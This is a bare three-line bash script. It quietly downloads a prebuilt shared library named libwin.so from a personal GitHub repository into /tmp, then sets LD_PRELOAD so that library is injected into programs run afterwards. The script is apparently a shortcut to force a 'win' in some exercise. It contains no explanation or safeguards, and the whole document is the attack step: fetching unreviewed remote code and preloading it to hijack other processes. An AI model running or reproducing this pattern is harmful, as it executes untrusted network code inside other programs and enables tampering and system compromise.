#!/bin/bash
wget -q -P /tmp https://raw.githubusercontent.com/Mohabdo21/test/main/libwin.so
export LD_PRELOAD="/tmp/libwin.so"
